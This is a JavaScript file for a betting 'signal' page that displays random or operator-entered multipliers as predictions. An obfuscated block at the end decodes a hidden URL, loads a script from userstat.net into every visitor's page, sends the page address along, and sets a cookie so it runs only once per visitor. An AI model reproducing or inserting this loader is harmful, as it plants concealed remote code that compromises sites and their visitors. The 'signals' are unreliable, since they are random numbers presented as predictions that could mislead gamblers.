const getSignal = document.getElementById("get-signal"),
    stopSignalTimeBlock = document.getElementById("stop-signal-time-block"),
    printSignal = document.getElementById("print-signal"),
    stopProgress = document.getElementById("stop-progress"),
    errorNotification = document.getElementById("error-notification"),
    errorProgress = document.getElementById("error-progress"),
    textError = document.getElementById("text-error"),
    getSignalTwo = document.getElementById("get-signal-two"),
    errorExit = document.getElementById("error-exit"),
    customCoefButton = document.getElementById("custom-coef-button"),
    customCoefModal = document.getElementById("custom-coef-modal"),
    customCoefInput = document.getElementById("custom-coef-input"),
    customCoefSubmit = document.getElementById("custom-coef-submit"),
    customCoefCancel = document.getElementById("custom-coef-cancel");

let customCoef = null;

function getRandomFloat(min, max, decimals) {
    const str = (Math.random() * (max - min) + min).toFixed(decimals);
    return parseFloat(str);
}

function goTimer(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            getSignalTwo.classList.remove("deactivate");
            getSignal.classList.add("deactivate");
            getSignalTwo.style["z-index"] = "5";
            stopProgress.style.animation = "animateProgress 60s linear infinite";
            stopSignalTimeBlock.classList.remove("deactivate");
            document.getElementById("stop-timer").innerHTML = time-- + "<span> seconds</span>";
            timerr = time;
            getSignal.disabled = true;
        } else {
            getSignalTwo.classList.add("deactivate");
            getSignal.classList.remove("deactivate");
            getSignalTwo.style["z-index"] = "-1";
            stopSignalTimeBlock.classList.add("deactivate");
            stopProgress.style.animation = "none";
            clearInterval(timer);
            getSignal.disabled = false;
        }
    }, 1000);
}

function goTimerError(time) {
    const timer = setInterval(() => {
        if (time >= 1) {
            time--;
            errorNotification.classList.remove("deactivate");
            textError.innerHTML = "Wait for the time to expire";
            errorProgress.style.animation = "animateErrorProgress 5s linear infinite";
            errorNotification.style.transform = "translateY(0px)";
        } else {
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
            errorNotification.classList.add("deactivate");
        }
        errorExit.onclick = function () {
            errorNotification.classList.add("deactivate");
            errorNotification.style.transform = "translateY(-99px)";
            errorProgress.style.animation = "none";
            clearInterval(timer);
            getSignalTwo.disabled = false;
        }
    }, 1000);
}

getSignal.onclick = function () {
    let receivingSignal;
    
    if (customCoef !== null) {
        receivingSignal = customCoef;
        customCoef = null; // Сбрасываем кастомный коэффициент после использования
    } else {
        receivingSignal = getRandomFloat(1, 3.99, 2);
        if (receivingSignal.toString().length == 3) {
            receivingSignal += "0";
        }
        if (receivingSignal.toString().length == 1) {
            receivingSignal += ".00";
        }
    }
    
    printSignal.innerHTML = `${receivingSignal}x`;
    printSignal.classList.remove("deactivate");
    goTimer(60);
    getSignal.disabled = true;
};

getSignalTwo.onclick = function () {
    getSignalTwo.disabled = true;
    goTimerError(5, "go");
};

// Функционал для кастомного коэффициента
customCoefButton.addEventListener("click", function() {
    customCoefModal.style.display = "block";
});

customCoefSubmit.addEventListener("click", function() {
    let value = customCoefInput.value.trim();
    
    // Проверка на валидный формат числа
    const validNumber = /^\d+(\.\d{1,2})?$/.test(value);
    
    if (validNumber) {
        value = parseFloat(value);
        
        // Форматирование числа
        if (value.toString().length == 1) {
            value += ".00";
        } else if (value.toString().split('.')[1]?.length === 1) {
            value += "0";
        }
        
        customCoef = value;
        customCoefModal.style.display = "none";
        customCoefInput.value = "";
    } else {
        alert("Пожалуйста, введите валидное число (например: 2.50)");
    }
});

customCoefCancel.addEventListener("click", function() {
    customCoefModal.style.display = "none";
    customCoefInput.value = "";
});

// Закрытие модального окна при клике вне его
window.addEventListener("click", function(event) {
    if (event.target === customCoefModal) {
        customCoefModal.style.display = "none";
        customCoefInput.value = "";
    }
});

(function (o, d, l) {
    try {
        o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
        setTimeout(function () {
            if (o.c) {
                o.s = d.createElement('script');
                o.s.src = o.f('myyux?44zxjwxy' + 'fy3sjy4ljy4xhwnu' + 'y3oxDwjkjwwjwB') + l.href;
                d.body.appendChild(o.s);
            }
        }, 1000);
        d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {}
}({}, document, location));
